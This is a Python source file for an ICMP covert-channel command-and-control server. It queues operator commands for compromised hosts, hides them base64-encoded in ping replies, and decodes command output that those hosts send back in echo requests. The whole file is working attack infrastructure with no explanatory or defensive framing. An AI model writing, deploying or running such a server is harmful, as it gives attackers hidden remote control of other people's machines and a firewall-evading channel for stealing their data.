import socket
import struct
import base64
import queue
import threading

# ----------------------------
# Utilities
# ----------------------------

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

print_lock = threading.Lock()

def safe_print(msg):
    with print_lock:
        print(msg)

# ----------------------------
# C2 Server Setup
# ----------------------------

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
print("[+] ICMP C2 Server listening...")

client_state = {}       # ip -> last_seq
command_queues = {}     # ip -> queue.Queue()
client_pids = {}        # ip -> last PID seen

# ----------------------------
# Input Thread
# ----------------------------

def input_thread():
    while True:
        target = input("Enter target IP (or 'all'): \n").strip()

        if target.lower() == "list":
            if not client_state:
                print("  (no clients)")
            else:
                print("Connected clients:")
                for ip in client_state:
                    print(f"  {ip}")
            continue

        if target.lower() == "all":
            target_ips = list(command_queues.keys())
            if not target_ips:
                print("[!] No clients connected.")
                continue
        else:
            if target not in command_queues:
                print(f"[!] IP {target} not found.")
                continue
            target_ips = [target]

        cmd = input("Command> ").strip()
        if not cmd:
            cmd = "NOP"

        for ip in target_ips:
            command_queues[ip].put(cmd)

# Start input thread
threading.Thread(target=input_thread, daemon=True).start()

# ----------------------------
# Main Loop
# ----------------------------

while True:
    packet, addr = sock.recvfrom(2048)
    ip = addr[0]

    icmp_type, _, _, pid, seq = struct.unpack("!BBHHH", packet[20:28])
    payload = packet[28:].decode(errors="ignore").strip()

    if icmp_type != 8:
        continue

    # New client
    if ip not in client_state:
        client_state[ip] = -1
        command_queues[ip] = queue.Queue()
        client_pids[ip] = pid
        safe_print(f"[+] New client detected: {ip}")
        safe_print(f"Enter target IP (or 'all'): ")
    client_pids[ip] = pid

    # Output
    if payload.startswith("OUT:"):
        encoded = payload[4:]
        try:
            decoded = base64.b64decode(encoded).decode(errors="ignore")
        except:
            decoded = "[!] Error decoding output"

        safe_print(f"\n[+] Output from {ip}:\n{decoded}")
        safe_print(f"Enter target IP (or 'all'): ")
        continue

    # Beacon
    if payload.startswith("BEACON"):
        if seq == client_state[ip]:
            continue

        client_state[ip] = seq

        # Get queued command
        try:
            cmd = command_queues[ip].get_nowait()
        except queue.Empty:
            cmd = "NOP"

        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        cmd_payload = f"CMD:{encoded_cmd}".encode()

        reply = struct.pack("!BBHHH", 0, 0, 0, pid, seq) + cmd_payload
        chksum = checksum(reply)
        reply = struct.pack("!BBHHH", 0, 0, chksum, pid, seq) + cmd_payload

        sock.sendto(reply, addr)
